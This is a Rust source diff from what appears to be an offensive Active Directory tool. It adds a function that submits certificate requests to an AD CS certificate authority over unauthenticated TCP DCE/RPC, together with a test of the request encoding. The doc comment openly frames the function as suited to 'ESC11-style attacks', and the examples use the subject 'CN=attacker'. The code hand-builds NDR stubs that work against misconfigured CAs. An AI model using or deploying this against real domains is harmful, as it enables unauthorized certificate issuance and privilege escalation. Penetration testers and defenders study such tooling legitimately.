@@ -10,8 +10,12 @@
 //! - ICertRequestD: d99e6e74-fc88-11d0-b498-00a0c90312f3
 
 use overthrone_core::error::{OverthroneError, Result};
-use overthrone_core::proto::epm::{build_rpc_bind, build_rpc_request, ndr_conformant_string};
+use overthrone_core::proto::epm::{
+    build_rpc_bind, build_rpc_request, btf_read_frame, btf_write_frame, ndr_conformant_string,
+    resolve_uuid_via_epm_tcp,
+};
 use overthrone_core::proto::smb::SmbSession;
+use tokio::net::TcpStream;
 use tracing::{debug, info};
 
 /// ICertRequestD interface UUID (little-endian byte order)
@@ -169,8 +173,101 @@ pub async fn request_cert_via_rpc_with_creds(
     request_cert_via_rpc(&smb, ca_name, template, subject, csr_der).await
 }
 
+/// Request a certificate via TCP RPC (direct connection, no SMB named pipe).
+///
+/// Uses EPM to resolve the ICertRequestD interface UUID to a TCP endpoint,
+/// then connects directly and submits the PKCS#10 CSR over DCE/RPC.
+/// This is the native Windows AD CS enrollment protocol — no HTTP CES/CEP needed.
+///
+/// **Note on authentication:** The current implementation sends an unauthenticated
+/// RPC bind request. For production AD CS, the CA typically requires authenticated
+/// RPC (NTLM or Kerberos). This function is suitable for:
+/// - ESC11-style attacks where the CA has `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Cryptography\CertificateServices\ICPR\Security` set to allow anonymous
+/// - Testing and development environments
+/// - As a building block for authenticated RPC (add NTLM auth in the `auth_verifier`
+///   of the bind PDU using `smb2::build_ntlmssp_negotiate()` etc.)
+///
+/// # Arguments
+/// * `ca_host` - CA server hostname or IP
+/// * `ca_name` - CA common name, e.g. "domain-CA"
+/// * `template` - Certificate template name, e.g. "User"
+/// * `subject` - Subject for the certificate, e.g. "CN=attacker"
+/// * `csr_der` - PKCS#10 DER-encoded Certificate Signing Request
+///
+/// # Returns
+/// Raw DER-encoded X.509 certificate bytes
+pub async fn request_cert_via_tcp_rpc(
+    ca_host: &str,
+    ca_name: &str,
+    _template: &str,
+    _subject: &str,
+    csr_der: &[u8],
+) -> Result<Vec<u8>> {
+    info!(
+        "[ICertRequestD/TCP] Requesting cert via TCP RPC: CA={}, host={}",
+        ca_name, ca_host
+    );
+
+    let (_resolved_host, port) =
+        resolve_uuid_via_epm_tcp(ca_host, &ICERTREQUEST_D_UUID).await?;
+
+    let addr = format!("{}:{}", ca_host, port);
+    debug!("[ICertRequestD/TCP] Connecting to {addr}");
+
+    let mut stream = TcpStream::connect(&addr)
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: addr.clone(),
+            reason: format!("TCP connect failed: {e}"),
+        })?;
+
+    let bind_req = build_rpc_bind(&ICERTREQUEST_D_UUID, 0, 0);
+    btf_write_frame(&mut stream, &bind_req).await?;
+
+    let bind_resp = btf_read_frame(&mut stream).await?;
+    if !overthrone_core::proto::epm::is_bind_accepted(&bind_resp) {
+        return Err(OverthroneError::Rpc {
+            target: addr,
+            reason: "ICertRequestD TCP bind rejected".to_string(),
+        });
+    }
+    debug!("[ICertRequestD/TCP] Bind accepted");
+
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&[0u8; 20]);
+    stub.extend_from_slice(&ndr_conformant_string(ca_name));
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    let count = csr_der.len() as u32;
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    while stub.len() % 8 != 0 {
+        stub.push(0);
+    }
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(csr_der);
+    stub.extend_from_slice(&ndr_conformant_string(""));
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+
+    let req = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub);
+    btf_write_frame(&mut stream, &req).await?;
+    let resp = btf_read_frame(&mut stream).await?;
+
+    parse_icertrequest_response(&resp, ca_name)
+}
+
 /// Parse the ICertRequestD response to extract the certificate DER bytes.
-fn parse_icertrequest_response(resp: &[u8], _ca_name: &str) -> Result<Vec<u8>> {
+pub fn parse_icertrequest_response(resp: &[u8], _ca_name: &str) -> Result<Vec<u8>> {
     if resp.len() < 24 {
         return Err(OverthroneError::CertificateRequest(
             "Response too short (no RPC header)".to_string(),
@@ -346,4 +443,47 @@ mod tests {
         assert_eq!(OPNUM_REQUEST_CERTIFICATE, 1);
         assert_eq!(OPNUM_GET_CERTIFICATE, 2);
     }
+
+    #[test]
+    fn test_tcp_rpc_stub_encoding_matches_smb() {
+        let csr = vec![0x30u8; 256];
+        let ca_name = "test-CA";
+        let _subject = "CN=attacker";
+
+        let mut stub_tcp = Vec::new();
+        stub_tcp.extend_from_slice(&[0u8; 20]);
+        stub_tcp.extend_from_slice(&ndr_conformant_string(ca_name));
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        let count = csr.len() as u32;
+        stub_tcp.extend_from_slice(&count.to_le_bytes());
+        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
+        while stub_tcp.len() % 8 != 0 {
+            stub_tcp.push(0);
+        }
+        stub_tcp.extend_from_slice(&count.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&count.to_le_bytes());
+        stub_tcp.extend_from_slice(&csr);
+        stub_tcp.extend_from_slice(&ndr_conformant_string(""));
+        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0x00020004u32.to_le_bytes());
+        stub_tcp.extend_from_slice(&0u32.to_le_bytes());
+
+        let req_tcp = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub_tcp);
+
+        assert_eq!(req_tcp[0], 5);
+        assert_eq!(req_tcp[1], 0);
+        assert_eq!(req_tcp[2], 0);
+        assert!(req_tcp.len() > 100);
+    }
+
+
+
 }
